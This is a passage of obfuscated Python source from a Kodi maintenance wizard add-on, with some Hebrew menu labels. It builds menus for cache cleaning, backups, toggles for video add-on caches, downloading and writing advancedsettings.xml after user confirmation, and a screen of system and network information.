		O00OO0O0OO0OO0OO0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:3204
		O00000O0OO0OOOO0O ='true'if INCLUDEONECHAN =='true'else 'false'#line:3205
		OOOO0O0O000O0000O ='true'if INCLUDESALTS =='true'else 'false'#line:3206
		OOO00O00O00O00OO0 ='true'if INCLUDESALTSHD =='true'else 'false'#line:3207
	OO00000OOOO00OO0O =wiz .getSize (PACKAGES )#line:3208
	O0O0OOO0O0OO0000O =wiz .getSize (THUMBS )#line:3209
	OO00O00O00OO00O0O =wiz .getCacheSize ()#line:3210
	O0OO0O0O0O0OO0OOO =OO00000OOOO00OO0O +O0O0OOO0O0OO0000O +OO00O00O00OO00O0O #line:3211
	OOO0O0OOOOO000O0O =['Daily','Always','3 Days','Weekly']#line:3212
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3213
	if view =="clean"or SHOWMAINT =='true':#line:3214
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO0O0O0O0OO0OOO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3215
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00O00O00OO00O0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3216
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00000OOOO00OO0O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3217
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O0OOO0O0OO0000O ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3218
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3219
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3220
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3221
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3222
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3223
	if view =="addon"or SHOWMAINT =='false':#line:3224
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3225
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3226
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3227
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3228
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3229
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3230
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3231
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3232
	if view =="misc"or SHOWMAINT =='true':#line:3233
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3234
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3235
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3236
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3237
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3238
		addFile ('View Errors in Log: %s'%(O0O0OO0OO00OOO0OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3239
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3240
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3241
		addFile ('Clear Wizard Log File%s'%O0000OOOO0O0O0OO0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3242
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3243
	if view =="backup"or SHOWMAINT =='true':#line:3244
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3245
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3246
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3247
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3248
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3249
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3250
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3251
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3252
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3253
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3254
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3255
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3256
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3257
	if view =="tweaks"or SHOWMAINT =='true':#line:3258
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3259
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3260
		else :#line:3261
			if os .path .exists (ADVANCED ):#line:3262
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3263
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3264
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3265
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3266
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3267
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3268
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3269
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3270
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3271
	addFile ('Show All Maintenance: %s'%O0000OO0O00000000 .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3272
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3273
	addFile ('Third Party Wizards: %s'%OOO0O00OO00OO0O00 .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3274
	if OOO0O00OO00OO0O00 =='true':#line:3275
		OO0OOOOOO00O0O0O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3276
		OOOOO0O0O0O00OOOO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3277
		OO0000O000OO00O0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3278
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OOOOOO00O0O0O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3279
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO0O0O0O00OOOO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3280
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0000O000OO00O0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3281
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3282
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO000OOOOO00OO000 .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3283
	if OO000OOOOO00OO000 =='true':#line:3284
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOO0O0OOOOO000O0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3285
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO00OOO00OO0000O0 .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3286
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00O00OO0OOOO0OO .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3287
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0OOO0O000O000O0O .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3288
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3289
	addFile ('Include Video Cache in Clear Cache: %s'%O0O00OO0O0O000OOO .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3290
	if O0O00OO0O0O000OOO =='true':#line:3291
		addFile ('--- Include All Video Addons: %s'%OO00OO0OOOOOOOO00 .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3292
		addFile ('--- Include Bob: %s'%O0O00O00OO000OO0O .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3293
		addFile ('--- Include Phoenix: %s'%O000OOO0000000O0O .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3294
		addFile ('--- Include Specto: %s'%O000O0OOO0OOOO00O .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3295
		addFile ('--- Include Exodus: %s'%O00OO0O0OO0OO0OO0 .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3296
		addFile ('--- Include Salts: %s'%OOOO0O0O000O0000O .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3297
		addFile ('--- Include Salts HD Lite: %s'%OOO00O00O00O00OO0 .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3298
		addFile ('--- Include One Channel: %s'%O00000O0OO0OOOO0O .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3299
		addFile ('--- Include Genesis: %s'%OOOO0O000OOOOO0OO .replace ('true',O00OO0O000O000OOO ).replace ('false',O000OO000O000OO00 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3300
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3301
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3302
	setView ('files','viewType')#line:3303
def advancedWindow (url =None ):#line:3305
	if not ADVANCEDFILE =='http://':#line:3306
		if url ==None :#line:3307
			O0OO0O000OOOO00OO =wiz .workingURL (ADVANCEDFILE )#line:3308
			O00O00OOOO00000O0 =uservar .ADVANCEDFILE #line:3309
		else :#line:3310
			O0OO0O000OOOO00OO =wiz .workingURL (url )#line:3311
			O00O00OOOO00000O0 =url #line:3312
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3313
		if os .path .exists (ADVANCED ):#line:3314
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3315
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3316
		if O0OO0O000OOOO00OO ==True :#line:3317
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3318
			O0O0O0000O00OOO00 =wiz .openURL (O00O00OOOO00000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3319
			OO0O0000OO00O0O0O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0O0000O00OOO00 )#line:3320
			if len (OO0O0000OO00O0O0O )>0 :#line:3321
				for OOOO00OOO000O00O0 ,OOOO00OOOOO0000OO ,url ,O0O000000OO0O0O0O ,OO000OO0O0O0O00OO ,OOOOOO0O0O00O0O0O in OO0O0000OO00O0O0O :#line:3322
					if OOOO00OOOOO0000OO .lower ()=="yes":#line:3323
						addDir ("[B]%s[/B]"%OOOO00OOO000O00O0 ,'advancedsetting',url ,description =OOOOOO0O0O00O0O0O ,icon =O0O000000OO0O0O0O ,fanart =OO000OO0O0O0O00OO ,themeit =THEME3 )#line:3324
					else :#line:3325
						addFile (OOOO00OOO000O00O0 ,'writeadvanced',OOOO00OOO000O00O0 ,url ,description =OOOOOO0O0O00O0O0O ,icon =O0O000000OO0O0O0O ,fanart =OO000OO0O0O0O00OO ,themeit =THEME2 )#line:3326
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3327
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OO0O000OOOO00OO )#line:3328
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3329
def writeAdvanced (O0OOO0000O0OO0000 ,O00O0OOOOO0O00O00 ):#line:3331
	O0OOO0O000O0OO0OO =wiz .workingURL (O00O0OOOOO0O00O00 )#line:3332
	if O0OOO0O000O0OO0OO ==True :#line:3333
		if os .path .exists (ADVANCED ):O0O00O0O0O000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OOO0000O0OO0000 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3334
		else :O0O00O0O0O000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OOO0000O0OO0000 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3335
		if O0O00O0O0O000OO0O ==1 :#line:3337
			OOO0OO0000OOO0OO0 =wiz .openURL (O00O0OOOOO0O00O00 )#line:3338
			O0OO0OO000OO00OO0 =open (ADVANCED ,'w');#line:3339
			O0OO0OO000OO00OO0 .write (OOO0OO0000OOO0OO0 )#line:3340
			O0OO0OO000OO00OO0 .close ()#line:3341
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3342
			wiz .killxbmc (True )#line:3343
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3344
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OOO0O000O0OO0OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3345
def viewAdvanced ():#line:3347
	OOO0O000O00OO000O =open (ADVANCED )#line:3348
	OO0O00OO00O0000OO =OOO0O000O00OO000O .read ().replace ('\t','    ')#line:3349
	wiz .TextBox (ADDONTITLE ,OO0O00OO00O0000OO )#line:3350
	OOO0O000O00OO000O .close ()#line:3351
def removeAdvanced ():#line:3353
	if os .path .exists (ADVANCED ):#line:3354
		wiz .removeFile (ADVANCED )#line:3355
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3356
def showAutoAdvanced ():#line:3358
	notify .autoConfig ()#line:3359
def getIP ():#line:3361
	OO000000OO00OO00O ='http://whatismyipaddress.com/'#line:3362
	if not wiz .workingURL (OO000000OO00OO00O ):return 'Unknown','Unknown','Unknown'#line:3363
	OOOO0000000OO0OO0 =wiz .openURL (OO000000OO00OO00O ).replace ('\n','').replace ('\r','')#line:3364
	if not 'Access Denied'in OOOO0000000OO0OO0 :#line:3365
		O000OOOO0OOO0O0OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOO0000000OO0OO0 )#line:3366
		OOO0OOO00O00OOO00 =O000OOOO0OOO0O0OO [0 ]if (len (O000OOOO0OOO0O0OO )>0 )else 'Unknown'#line:3367
		O00O0OO0O0O0OOOO0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOO0000000OO0OO0 )#line:3368
		OO00O0O0O0OOOOO00 =O00O0OO0O0O0OOOO0 [0 ]if (len (O00O0OO0O0O0OOOO0 )>0 )else 'Unknown'#line:3369
		OO0000OOO0OO0000O =O00O0OO0O0O0OOOO0 [1 ]+', '+O00O0OO0O0O0OOOO0 [2 ]+', '+O00O0OO0O0O0OOOO0 [3 ]if (len (O00O0OO0O0O0OOOO0 )>2 )else 'Unknown'#line:3370
		return OOO0OOO00O00OOO00 ,OO00O0O0O0OOOOO00 ,OO0000OOO0OO0000O #line:3371
	else :return 'Unknown','Unknown','Unknown'#line:3372
def systemInfo ():#line:3374
	OOO0OO00OOOO000OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3388
	OOO0OOOOOO0OO0000 =[];O0O0OO0OOO0OO0O0O =0 #line:3389
	for OO000O0OOO0000O0O in OOO0OO00OOOO000OO :#line:3390
		OO000O0O0OOO0OO00 =wiz .getInfo (OO000O0OOO0000O0O )#line:3391
		OO00OO0OOO00O0OO0 =0 #line:3392
		while OO000O0O0OOO0OO00 =="Busy"and OO00OO0OOO00O0OO0 <10 :#line:3393
			OO000O0O0OOO0OO00 =wiz .getInfo (OO000O0OOO0000O0O );OO00OO0OOO00O0OO0 +=1 ;wiz .log ("%s sleep %s"%(OO000O0OOO0000O0O ,str (OO00OO0OOO00O0OO0 )));xbmc .sleep (1000 )#line:3394
		OOO0OOOOOO0OO0000 .append (OO000O0O0OOO0OO00 )#line:3395
		O0O0OO0OOO0OO0O0O +=1 #line:3396
	OOOO0OOO00O0O0OO0 =OOO0OOOOOO0OO0000 [8 ]if 'Una'in OOO0OOOOOO0OO0000 [8 ]else wiz .convertSize (int (float (OOO0OOOOOO0OO0000 [8 ][:-8 ]))*1024 *1024 )#line:3397
	O00O0O00O0OO00000 =OOO0OOOOOO0OO0000 [9 ]if 'Una'in OOO0OOOOOO0OO0000 [9 ]else wiz .convertSize (int (float (OOO0OOOOOO0OO0000 [9 ][:-8 ]))*1024 *1024 )#line:3398
	OO00000O00OOOOO0O =OOO0OOOOOO0OO0000 [10 ]if 'Una'in OOO0OOOOOO0OO0000 [10 ]else wiz .convertSize (int (float (OOO0OOOOOO0OO0000 [10 ][:-8 ]))*1024 *1024 )#line:3399
	O0000O0OOOOO0OOO0 =wiz .convertSize (int (float (OOO0OOOOOO0OO0000 [11 ][:-2 ]))*1024 *1024 )#line:3400
	OOO0O000O00O00OO0 =wiz .convertSize (int (float (OOO0OOOOOO0OO0000 [12 ][:-2 ]))*1024 *1024 )#line:3401
	O000O0O0O0O0OO0OO =wiz .convertSize (int (float (OOO0OOOOOO0OO0000 [13 ][:-2 ]))*1024 *1024 )#line:3402
	O0OO000OOO00OO0OO ,OO0000O0000O000OO ,O0OO0O0OOOOOO0O00 =getIP ()#line:3403
	OOOOO0OO0OOO00O00 =[];OO00O00OOO0OOO0OO =[];OO0O0OO00O000O0O0 =[];OOO00OOO0OO000O0O =[];O000O00O0OOOOO00O =[];O0O0OO0OOO00OO0O0 =[];OOO0OO00OO00000OO =[]#line:3405
	O0OO0O0OOO00OOOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3407
	for OOOOOO0OOOO000000 in sorted (O0OO0O0OOO00OOOO0 ,key =lambda OO00O00OO0O00O0OO :OO00O00OO0O00O0OO ):#line:3408
		OOOO0O0OO00O0000O =os .path .split (OOOOOO0OOOO000000 [:-1 ])[1 ]#line:3409
		if OOOO0O0OO00O0000O =='packages':continue #line:3410
		O0OO0000O0O00OOOO =os .path .join (OOOOOO0OOOO000000 ,'addon.xml')#line:3411
		if os .path .exists (O0OO0000O0O00OOOO ):#line:3412
			O000OO0000000000O =open (O0OO0000O0O00OOOO )#line:3413
			O000O00OO0O0O00O0 =O000OO0000000000O .read ()#line:3414
			O0OOO0O0O0O00O0O0 =re .compile ("<provides>(.+?)</provides>").findall (O000O00OO0O0O00O0 )#line:3415
			if len (O0OOO0O0O0O00O0O0 )==0 :#line:3416
				if OOOO0O0OO00O0000O .startswith ('skin'):OOO0OO00OO00000OO .append (OOOO0O0OO00O0000O )#line:3417
				if OOOO0O0OO00O0000O .startswith ('repo'):O000O00O0OOOOO00O .append (OOOO0O0OO00O0000O )#line:3418
				else :O0O0OO0OOO00OO0O0 .append (OOOO0O0OO00O0000O )#line:3419
			elif not (O0OOO0O0O0O00O0O0 [0 ]).find ('executable')==-1 :OOO00OOO0OO000O0O .append (OOOO0O0OO00O0000O )#line:3420
			elif not (O0OOO0O0O0O00O0O0 [0 ]).find ('video')==-1 :OO0O0OO00O000O0O0 .append (OOOO0O0OO00O0000O )#line:3421
			elif not (O0OOO0O0O0O00O0O0 [0 ]).find ('audio')==-1 :OO00O00OOO0OOO0OO .append (OOOO0O0OO00O0000O )#line:3422
			elif not (O0OOO0O0O0O00O0O0 [0 ]).find ('image')==-1 :OOOOO0OO0OOO00O00 .append (OOOO0O0OO00O0000O )#line:3423
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3425
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3426
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3427
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3428
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3429
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3430
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3432
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3433
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3434
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3436
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOO00O0O0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3437
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00O0O00O0OO00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3438
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00000O00OOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3439
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3441
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000O0OOOOO0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3442
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O000O00O00OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3443
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O0O0O0O0OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3444
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3446
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3447
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO000OOO00OO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3448
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000O0000O000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3449
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OO0O0OOOOOO0O00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3450
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OOOOOO0OO0000 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3451
	OOO00O0OOO0000OOO =len (OOOOO0OO0OOO00O00 )+len (OO00O00OOO0OOO0OO )+len (OO0O0OO00O000O0O0 )+len (OOO00OOO0OO000O0O )+len (O0O0OO0OOO00OO0O0 )+len (OOO0OO00OO00000OO )+len (O000O00O0OOOOO00O )#line:3453
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOO00O0OOO0000OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3454
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0O0OO00O000O0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3455
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO00OOO0OO000O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3456
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O00OOO0OOO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3457
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOO0OO0OOO00O00 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3458
